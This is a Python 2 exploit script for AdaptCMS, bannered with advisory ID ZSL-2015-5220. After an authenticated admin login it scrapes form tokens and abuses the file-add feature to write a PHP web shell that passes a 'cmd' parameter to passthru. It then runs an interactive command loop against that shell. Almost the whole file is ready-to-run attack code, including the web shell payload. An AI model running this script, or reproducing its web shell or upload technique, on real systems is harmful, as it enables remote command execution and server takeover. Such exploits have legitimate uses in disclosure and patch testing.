#!/usr/bin/env python

import itertools, mimetools, mimetypes, os
import cookielib, urllib, urllib2, sys, re

from cStringIO import StringIO
from urllib2 import URLError

piton = os.path.basename(sys.argv[0])

def bannerche():
	print """
 o==========================================o
 |                                          |
 |        AdaptCMS RCE Exploit              |
 |                                          |
 |                        ID:ZSL-2015-5220  |
 |  o/                                      |
 +------------------------------------------+
		"""
	if len(sys.argv) < 3:
		print '\x20\x20[*] Usage: '+piton+' <hostname> 
<pathname>'
		print '\x20\x20[*] Example: '+piton+' zeroscience.mk 
adaptcms\n'
		sys.exit()

bannerche()

host = sys.argv[1]
path = sys.argv[2]

cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))

try:
	gettokens = opener.open('http://'+host+'/'+path+'/login')
except urllib2.HTTPError, errorzio:
	if errorzio.code == 404:
		print 'Path error.'
		sys.exit()
except URLError, errorziocvaj:
	if errorziocvaj.reason:
		print 'Hostname error.'
		sys.exit()

print '\x20\x20[*] Login please.'

tokenfields = re.search('fields]" value="(.+?)" id=', 
gettokens.read()).group(1)
gettokens = opener.open('http://'+host+'/'+path+'/login')
tokenkey = re.search('key]" value="(.+?)" id=', 
gettokens.read()).group(1)

username = raw_input('\x20\x20[*] Enter username: ')
password = raw_input('\x20\x20[*] Enter password: ')

login_data = urllib.urlencode({
							'_method' : 
'POST',
							
'data[User][username]' : username,
							
'data[User][password]' : password,
							
'data[_Token][fields]' : '864206fbf949830ca94401a65660278ae7d065b3%3A',
							
'data[_Token][key]' : tokenkey,
							
'data[_Token][unlocked]' : ''
							})

login = opener.open('http://'+host+'/'+path+'/login', login_data)
auth = login.read()
for session in cj:
	sessid = session.name

ses_chk = re.search(r'%s=\w+' % sessid , str(cj))
cookie = ses_chk.group(0)
print '\x20\x20[*] Accessing...'

upload = opener.open('http://'+host+'/'+path+'/admin/files/add')
filetoken = re.search('key]" value="(.+?)" id=', upload.read()).group(1)

class MultiPartForm(object):

    def __init__(self):
        self.form_fields = []
        self.files = []
        self.boundary = mimetools.choose_boundary()
        return
    
    def get_content_type(self):
        return 'multipart/form-data; boundary=%s' % self.boundary

    def add_field(self, name, value):
        self.form_fields.append((name, value))
        return

    def add_file(self, fieldname, filename, fileHandle, mimetype=None):
        body = fileHandle.read()
        if mimetype is None:
            mimetype = mimetypes.guess_type(filename)[0] or 
'application/octet-stream'
        self.files.append((fieldname, filename, mimetype, body))
        return
    
    def __str__(self):

        parts = []
        part_boundary = '--' + self.boundary
        
        parts.extend(
            [ part_boundary,
              'Content-Disposition: form-data; name="%s"' % name,
              '',
              value,
            ]
            for name, value in self.form_fields
            )
        
        parts.extend(
            [ part_boundary,
              'Content-Disposition: file; name="%s"; filename="%s"' % \
                 (field_name, filename),
              'Content-Type: %s' % content_type,
              '',
              body,
            ]
            for field_name, filename, content_type, body in self.files
            )
        
        flattened = list(itertools.chain(*parts))
        flattened.append('--' + self.boundary + '--')
        flattened.append('')
        return '\r\n'.join(flattened)

if __name__ == '__main__':

    form = MultiPartForm()
    form.add_field('_method', 'POST')
    form.add_field('data[_Token][key]', filetoken)
    form.add_field('data[File][type]', 'edit')
    form.add_field('data[0][File][filename]', '')
    form.add_field('data[0][File][dir]', 'uploads/')
    form.add_field('data[0][File][mimetype]', '')
    form.add_field('data[0][File][filesize]', '')
    form.add_field('data[File][content]', '<?php echo "<pre>"; 
passthru($_GET[\'cmd\']); echo "</pre>"; ?>')
    form.add_field('data[File][file_extension]', 'php')
    form.add_field('data[File][file_name]', 'thricer')
    form.add_field('data[File][caption]', 'THESHELL')
    form.add_field('data[File][dir]', 'uploads/')
    form.add_field('data[0][File][caption]', '')
    form.add_field('data[0][File][watermark]', '0')
    form.add_field('data[0][File][zoom]', 'C')
    form.add_field('data[File][resize_width]', '')
    form.add_field('data[File][resize_height]', '')
    form.add_field('data[0][File][random_filename]', '0')
    form.add_field('data[File][library]', '')
    form.add_field('data[_Token][fields]', 
'0e50b5f22866de5e6f3b959ace9768ea7a63ff3c%3A0.File.dir%7C0.File.filesize%7C0.File.mimetype%7CFile.dir')
    form.add_file('data[0][File][filename]', 'filename', 
fileHandle=StringIO(''))

    request = 
urllib2.Request('http://'+host+'/'+path+'/admin/files/add')
    request.add_header('User-agent', 'joxypoxy 6.0')
    body = str(form)
    request.add_header('Content-type', form.get_content_type())
    request.add_header('Cookie', cookie)
    request.add_header('Content-length', len(body))
    request.add_data(body)
    request.get_data()
    urllib2.urlopen(request).read()

f_loc = '/uploads/thricer.php'
print

while True:
	try:
		cmd = raw_input('shell@'+host+':~# ')
		execute = 
opener.open('http://'+host+'/'+path+f_loc+'?cmd='+urllib.quote(cmd))
		reverse = execute.read()
		pattern = re.compile(r'<pre>(.*?)</pre>',re.S|re.M)
		cmdout = pattern.match(reverse)
		print cmdout.groups()[0].strip()
		print
		if cmd.strip() == 'exit':
			break
	except Exception:
		break

print 'Session terminated.\n'

sys.exit()
